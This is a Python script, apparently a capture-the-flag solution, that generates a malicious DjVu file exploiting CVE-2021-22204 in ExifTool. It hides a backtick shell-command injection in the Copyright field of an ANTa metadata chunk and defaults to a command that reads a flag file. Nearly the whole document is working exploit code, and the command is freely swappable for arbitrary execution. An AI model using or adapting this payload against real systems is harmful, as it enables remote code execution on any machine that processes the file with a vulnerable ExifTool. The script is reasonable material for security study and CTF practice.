#!/usr/bin/env python3
"""
Generate a proper malicious DjVu file for CVE-2021-22204
"""

import sys

def create_djvu_exploit(command):
    """
    Create a DjVu file with command injection in metadata
    CVE-2021-22204: exiftool RCE via DjVu ANT chunk
    """
    
    # DjVu file structure
    djvu_header = b'AT&TFORM'
    djvu_size = b'\x00\x00\x00\x00'  # Will be updated
    djvu_type = b'DJVU'
    
    # INFO chunk
    info_chunk = b'INFO'
    info_size = b'\x00\x00\x00\n'
    info_data = b'\x08\x00\xb7\x00\x00\x00d\x00\x00\x00\x16'
    
    # Sjbz chunk (compressed data)
    sjbz_chunk = b'Sjbz'
    sjbz_size = b'\x00\x00\x00H'
    sjbz_data = b'\x00' * 72
    
    # BG44 chunk
    bg44_chunk = b'BG44'
    bg44_size = b'\x00\x00\x00\x0e'
    bg44_data = b'\x00' * 14
    
    # BGjp chunk  
    bgjp_chunk = b'BGjp'
    bgjp_size = b'\x00\x00\x00\x0c'
    bgjp_data = b'\x00\x00\x008BIM\x00\x04\x04\x00\x00\x00\x00\x00\x00'
    
    # Malicious metadata (ANT chunk with command injection)
    # This is where CVE-2021-22204 is exploited
    metadata = f'''(metadata
 (Copyright "\\
" . `{command}` . "\\\\
") )'''
    
    ant_chunk = b'ANTa'  # ANT annotation chunk
    ant_data = metadata.encode('utf-8')
    ant_size = len(ant_data).to_bytes(4, 'big')
    
    # Combine all chunks
    chunks = (
        info_chunk + info_size + info_data +
        sjbz_chunk + sjbz_size + sjbz_data +
        bg44_chunk + bg44_size + bg44_data +
        bgjp_chunk + bgjp_size + bgjp_data +
        ant_chunk + ant_size + ant_data
    )
    
    # Calculate total size
    total_size = len(djvu_type) + len(chunks)
    djvu_size = total_size.to_bytes(4, 'big')
    
    # Build final file
    djvu_file = djvu_header + djvu_size + djvu_type + chunks
    
    return djvu_file


if __name__ == '__main__':
    # Command to execute
    command = '(/usr/local/bin/readflag || cat /flag.txt) 2>&1'
    
    djvu_data = create_djvu_exploit(command)
    
    # Write to file
    with open('exploit.djvu', 'wb') as f:
        f.write(djvu_data)
    
    print(f"[+] Created exploit.djvu ({len(djvu_data)} bytes)")
    print(f"[+] Command: {command}")
    
    # Also print as text for payload.txt
    print("\n[+] For payload.txt, use this content:")
    print(djvu_data.decode('latin-1'))
